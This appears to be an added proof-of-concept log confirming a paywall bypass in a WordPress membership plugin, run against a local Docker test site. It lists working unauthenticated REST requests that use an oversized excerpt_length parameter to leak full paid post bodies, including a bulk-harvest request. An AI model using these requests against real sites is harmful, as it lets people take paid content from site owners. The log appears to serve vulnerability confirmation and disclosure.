@@ -1,0 +1,29 @@
+convertkit 3.4.9 - Member Content paywall bypass via REST excerpt - e2e CONFIRMED 2026-11-03T12:26:46Z
+WordPress 7.1.2, convertkit 3.4.9 (latest, released 2026-11-03), Docker, http://127.0.0.1:8093
+Plugin seeded into the normal API-connected state. Post 4 restricted to product_1.
+All requests below are unauthenticated with no cookies.
+
+=== [1] BASELINE: paywall is active ===
+GET /?rest_route=/wp/v2/posts/4
+content.rendered (340 chars):
+'SECRET-TOKEN-7731 This is the opening of the paid article that only paying members are supposed to read. It continues with a long run of subscriber only analysis so that the default fifty five word excerpt cannot possibly cover the whole thing, which lets us tell the difference between a truncated excerpt and the complete body. [&hellip;]'
+
+excerpt.rendered (340 chars):
+'SECRET-TOKEN-7731 This is the opening of the paid article that only paying members are supposed to read. It continues with a long run of subscriber only analysis so that the default fifty five word excerpt cannot possibly cover the whole thing, which lets us tell the difference between a truncated excerpt and the complete body. [&hellip;]'
+
+=== [2] BYPASS: excerpt_length + _fields ===
+GET /?rest_route=/wp/v2/posts/4&excerpt_length=100000&_fields=id,excerpt
+{"id":4,"excerpt":{"rendered":"<p>SECRET-TOKEN-7731 This is the opening of the paid article that only paying members are supposed to read. It continues with a long run of subscriber only analysis so that the default fifty five word excerpt cannot possibly cover the whole thing, which lets us tell the difference between a truncated excerpt and the complete body. We keep adding sentences here purely so the article is comfortably longer than the default excerpt window that WordPress applies when no manual excerpt exists on the post. END-OF-PAID-BODY<\/p>\n","protected":false}}
+
+=== [2b] BYPASS without _fields: content stays restricted, excerpt leaks ===
+GET /?rest_route=/wp/v2/posts/4&excerpt_length=100000
+content.rendered (340 chars) END-OF-PAID-BODY=no
+excerpt.rendered (518 chars) END-OF-PAID-BODY=YES
+
+=== [3] BULK harvest ===
+GET /?rest_route=/wp/v2/posts&per_page=100&excerpt_length=100000&_fields=id,excerpt
+[{"id":4,"excerpt":{"rendered":"<p>SECRET-TOKEN-7731 This is the opening of the paid article that only paying members are supposed to read. It continues with a long run of subscriber only analysis so that the default fifty five word excerpt cannot possibly cover the whole thing, which lets us tell the difference between a truncated excerpt and the complete body. We keep adding sentences here purely so the article is comfortably longer than the default excerpt window that WordPress applies when no manual excerpt exists on the post. END-OF-PAID-BODY<\/p>\n","protected":false}},{"id":1,"excerpt":{"rendered":"<p>Welcome to WordPress. This is your first post. Edit or delete it, then start writing!<\/p>\n","protected":false}}]
+
+=== [4] CONTROL: full body as stored ===
+518 chars
+'SECRET-TOKEN-7731 This is the opening of the paid article that only paying members are supposed to read. It continues with a long run of subscriber only analysis so that the default fifty five word excerpt cannot possibly cover the whole thing, which lets us tell the difference between a truncated excerpt and the complete body. We keep adding sentences here purely so the article is comfortably longer than the default excerpt window that WordPress applies when no manual excerpt exists on the post. END-OF-PAID-BODY'
